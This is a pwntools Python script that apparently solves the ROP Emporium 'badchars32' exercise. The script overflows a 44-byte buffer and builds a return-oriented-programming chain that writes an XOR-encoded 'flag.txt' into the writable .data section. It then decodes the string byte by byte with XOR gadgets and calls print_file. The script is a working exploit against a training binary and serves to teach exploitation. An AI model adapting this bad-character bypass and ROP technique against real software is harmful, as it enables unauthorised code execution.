# Essentially the same as write challenge, but inputs have badchars so we need to xor (encrypt) and xor (decrypt) them back

from pwn import *

elf = context.binary = ELF('./badchars32', checksec=False)
context.log_level = 'debug'

io = process()

pop_esi_edi_ebp = 0x080485b9        # pop esi; pop edi; pop ebp; ret;
data = 0x0804a018                   # .data section that is writable that we want to write (rabin2 -S badchars)
mov_edi_esi = 0x0804854f            # mov dword ptr [edi], esi; ret;

pop_ebp = 0x080485bb                # pop ebp; ret;
pop_ebx = 0x0804839d                # pop ebx; ret;
xor_ebp_bl = 0x08048547             # xor byte ptr [ebp], bl; ret;

ret = 0x08048386                    # ret


## Find offset 

# cyclic -a bcdefhijkl 100
# cyclic -a bcdefhijkl -l <4-byte string>



# Xor function to encrypt
def xor():
    flag = 'flag.txt'
    encoded = ''
    for i in flag:
        encoded += chr(ord(i) ^ 5)
    return encoded

encoded = xor() 


# Payload to send until xored inputs
payload = flat(
    b'A' * 44,
    pop_esi_edi_ebp,            # Populate 3 registers, esi, edi and ebp
    encoded[:4],                # Goes into esi
    data,                       # Goes into edi
    0x0,                        # Just filler for ebp
    mov_edi_esi,                # Writes esi (value) to edi pointer (location)
    pop_esi_edi_ebp,
    encoded[4:],
    data + 4,
    0x0,
    mov_edi_esi,
)



# For loop to xor back (decrypt) encrypted inputs
xor_value = 5

for i in range(len(encoded)):
    payload += flat(
        pop_ebp,                # Populates data location into ebp as it increments by 1
        data + i,
        pop_ebx,                # Populates the ebx register with 0x00000005, but xor gadget only takes in bl (lowest 8 bytes of ebx) which is 0x05
        xor_value,
        xor_ebp_bl,             # XOR's the data located at the location with bl value (key = 5)
    )


payload += flat(
    elf.plt['print_file'],      # Call function 
    ret,
    data
)


io.sendline(payload)
io.interactive()

### Note that the registers didn't need to be in order as long as the values were correct and the unused gadget registers were filled with null values (placeholders)





